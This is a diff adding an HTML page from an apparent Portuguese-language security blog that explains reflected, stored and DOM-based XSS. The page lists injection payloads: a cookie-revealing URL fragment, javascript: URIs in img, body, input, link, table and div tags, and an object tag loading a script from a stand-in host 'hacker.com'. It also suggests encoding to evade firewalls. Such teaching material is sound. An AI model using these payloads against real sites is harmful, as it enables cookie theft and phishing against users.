@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <title>Cross Site Scripting</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="desenvolvedor hat, hacking, linux, vulnerabilidades web, xss, Cross Site Scripting">
+    <meta name="description" content="Resumo sobre o Cross Site Scripting">
+    <meta name="robots" content="index">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <script src='https://kit.fontawesome.com/a076d05399.js'></script>
+    <link rel="stylesheet" type="text/css" href="style.css">
+  </head>
+  <body>
+    <div id="conteiner">
+      <header id="header">
+        <section id="titulo">
+          <h1>Desenvolvedor Hat</h1>
+        </section>
+        <nav id="menu">
+         <ul>
+           <li class="lista"><a href="/index.html"  target="_blank" class="link">Home</a></li>
+           
+           <li class="lista"><a href="/Linux/index.html" target="_blank" class="link">Linux</a></li>
+           
+           <li class="lista"><a href="/Vulnerabilidades/index.html" target="_blank" class="link">Vulnerabilidades</a></li>
+           
+           <li class="lista"><a href="/Coleta de Informação/index.html" target="_blank" class="link">Coleta de Informações</a></li>
+           
+           <li class="lista"><a href="/Sobre/index.html" target="_blank" class="link">Sobre</a></li>
+         </ul>
+       </nav>
+      </header>
+      <main id="main">
+        <article id="artigo">
+          <h1>Cross Site Scripting</h1>
+          <p class="p1">A vulnerabilidade de Cross Site Scripting (XSS) permite que o invasor injete código malicioso no navegador da vítima.</p>
+
+          <p class="p1">Existem três tipos principais de ataques XSS. São eles:</p>
+          <ul class="lista2">
+            <li>XSS refletido</li>
+            <li>XSS armazenado</li>
+            <li>XSS baseado em DOM</li>
+         </ul>
+         <p class="p1">Agora vamos entender o que cada uma dessas vulnerabilidades significa:</p>
+
+          <h2>XSS Refletido:</h2>
+          <p class="p1">Um ataque de XSS refletido acontece quando um invasor insere código malicioso em uma resposta HTTP, fazendo assim com que o usuário seja infectado quando abrir o link. O Cross Site Scripting refletido não é armazenado na aplicação, ou seja, o usuário só será infectado se abrir um determinado link contaminado com o código malicioso.</p>
+
+          <h2>XSS Armazenado:</h2>
+          <p class="p1">O ataque de XSS armazenado</p> acontece quando uma aplicação web armazena a entrada do usuário sem fazer nenhuma higienização para ser usada futuramente.
+          
+          <p class="p1">Note que, a entrada do usuário irá fazer parte da aplicação, sendo assim será executado no navegador do usuário com os privilégios da aplicação.</p>
+          
+          <p class="p1">O código malicioso será executado toda vez que alguém entrar no site infectado, note que para o código ser executado o usuário não precisa acessar o site por um determinado link (com o código malicioso), pois o código fica armazenado na própria aplicação, sendo essa a principal diferença entre o XSS refletido é o armazenado.</p>
+
+          <h2>XSS baseado em DOM:</h2>
+          <p class="p1">Um ataque de XSS baseado em DOM consiste na modificação do DOM no navegador do usuário. A modificação no ambiente DOM irá mudar e executar o código do lado do cliente da página web de maneira diferente, mas o script do invasor não irá aparecer na resposta HTTP. No entanto, a resposta HTTP (com o código malicioso) irá chegar ao servidor como parte de uma solicitação HTTP, sendo assim o ataque de XSS baseado em DOM pode ser detectado no lado do servidor.</p>
+
+          <p class="p1">Existe uma técnica que impede que o servidor reconheça um ataque de XSS baseado em DOM a partir dos dados enviados em uma solicitação HTTP. Essa técnica consiste no fato de que os fragmentos de URI não são enviados ao servidor pelo navegador. Para criar um fragmento de URI é necessário apenas que se adicione um hash (#) no início do fragmento. Como por exemplo:</p>
+          
+          <h3>URL original:</h3>
+          <span class="exemplo">http://www.algumsite.com/page.html?default=cumprimentos</span>
+
+          <h3>URL modificada:</h3>
+          <span class="exemplo">http://www.algumsite.com/page.html#default=&#60;script&#62;alert(document.cookie)&#60;/script&#62;</span>
+          
+          <p class="p1">Note que criamos um script que irá nos mostrar o cookie do usuário, no entanto esse script não será enviado para o servidor, pois determinamos que a partir da palavra default tudo será considerado um fragmento.</p>
+          
+          <h2>Explorando vulnerabilidades XSS:</h2>
+          <p class="p1">Para provar que uma aplicação web é vulnerável a Cross Site Scripting, você pode usar a função alert(), que irá criar uma caixa pop-up com alguma mensagem. Você pode tentar inserir essa função (ou qualquer outro script) nos parâmetros que são passados na URL; as entradas de dados, como por exemplo um campo de comentário.</p>
+
+           <p class="p1">No exemplo a seguir iremos testar se é possível inserir um script no parâmetro "roupas" que recebe o valor "camisetas" que é passado na URL.</p>
+           
+           <h3>A URL original do site é:</h3>
+           <span class="exemplo">https://www.loja.com/roupas=camisetas</span>
+
+           <p class="p1">Vamos inserir um script no parâmetro "roupas" que irá mostrar o domínio do site. A URL irá ficar a assim:</p>
+           
+           <span class="exemplo">https://www.loja.com/roupas= &#60;script&#62;alert(document.domain)&#60;/script&#62;</span>
+
+           <p class="p1">Após a execução do script o navegador irá mostrar uma caixa pop-up com o domínio do site.</p>
+           <p class="p1">No exemplo acima nós usamos a tag &#60;script&#62; para executar o script no navegador, no entanto existem diversas formas de se executar um script. A seguir iremos listar as principais alternativas para substituir a tag &#60;script&#62;:</p>
+           
+           <h2>Eventos JavaScript:</h2>
+           <p class="p1">Os atributos de evento são uma das principais formas de se executar um script, pois podem ser usados em várias tags diferentes. Como por exemplo:</p>
+           <span class="exemplo">&#60;body onload=alert("XSS")&#62;</span>
+           
+           <h2>Tag &#60;body&#62;:</h2>
+           <p class="p1">Um script pode ser executado usando a tag &#60;body&#62; em conjunto com algum atributo de evento (como no exemplo acima), ou usando o atributo background:</p>
+           
+           <span class="exemplo">&#60;body background="javascript:alert("XSS")"&#62;</span>
+           <h2>Tag &#60;img&#62;:</h2>
+           <p class="p1">Os navegadores executam o código javascript presente nos atributos da tag &#60;img&#62;:</p>
+           
+           <span>&#60;img src="javascript:alert("XSS");"&#62;</span>
+           
+           <span class="exemplo">&#60;img dynsrc="javascript:alert('XSS')"&#62;</span>
+           
+           <span class="exemplo">&#60;img lowsrc="javascript:alert('XSS')"&#62;</span>
+           
+           <h2>Tag &#60;iframe&#62;:</h2>
+           <p class="p1">A tag &#60;iframe&#62; é capaz de executar o javascript, no entanto essa tag não consegue acessar o DOM da página pai, por causa da Política de Segurança de Conteúdo (CSP) do navegador. A tag &#60;iframe&#62; é usada principalmente para fazer ataques de phishing, pois essa tag permite que seja inserido outra página HTML na página atual:</p>
+           
+           <span class="exemplo">&#60;iframe src="http://teste.com/xss.html"&#62;</span>
+           
+           <h2>Tag &#60;input&#62;:</h2>
+           <p class="p1">Se essa tag for usada em conjunto com o atributo type com o valor image, um script poderá ser executado:</p>
+           
+           <span class="exemplo">&#60;input type="image" src="javascript:alert('XSS');"&#62;</span>
+           
+           <h2>Tag &#60;link&#62;:</h2>
+           <p class="p1">Normalmente essa tag é usada para vincular folhas de estilo externas, no entanto ela pode ser usada para executar um script:</p>
+           
+           <span class="exemplo">&#60;link rel="stylesheet" href="javascript:alert('XSS');"&#62;</span>
+           
+           <h2>Tag &#60;table&#62;/&#60;td&#62;:</h2>
+           <p class="p1">As tags &#60;table&#62; e &#60;td&#62; podem ser usadas em conjunto com o atributo background para executar um script:</p>
+           
+           <span class="exemplo">&#60;table background="javascript:alert('XSS')"&#62;</span>
+           
+           <span class="exemplo">&#60;td background="javascript:alert('XSS')"&#62;</span>
+           
+           <h2>Tag &#60;div&#62;:</h2>
+           <p class="p1">A tag &#60;div&#62; executa um script de forma semelhante as tags &#60;table&#62; e &#60;td&#62;:</p>
+           
+           <span class="exemplo">&#60;div style="background-image:url(javascript:alert('XSS'))"&#62;</span>
+           
+           <span class="exemplo">&#60;div style="width:expression(alert('XSS'));"&#62;</span>
+           
+           <h2>Tag &#60;object&#62;:</h2>
+           <p class="p1">Essa tag pode ser usada para incluir um script de um site externo:</p>
+           
+           <span class="exemplo">&#60;object type="text/x-scriptlet" data="http://hacker.com/xss.html"&#62;</span>
+           
+           <p class="p1">Você também pode codificar o script, para tentar burlar algum firewall</p>
+        </article>
+       </main>
+       <footer id="footer">
+         <section id="rede">
+         <a href="https://instagram.com/desenvolvedor_hat?igshid=oaq65vlq2yfa" target="_blank"><span class="fab fa-instagram"></span></a>
+         <a href="https://github.com/DesenvolvedorHat" target="_blank"><span class="fab fa-github"></span></a>
+        </section>
+        <section id="direitos">
+          <p><span class="fa fa-copyright"></span>Alguns direitos reservados</p>
+        </section>
+       </footer>
+     </div>
+  </body>
+</html>
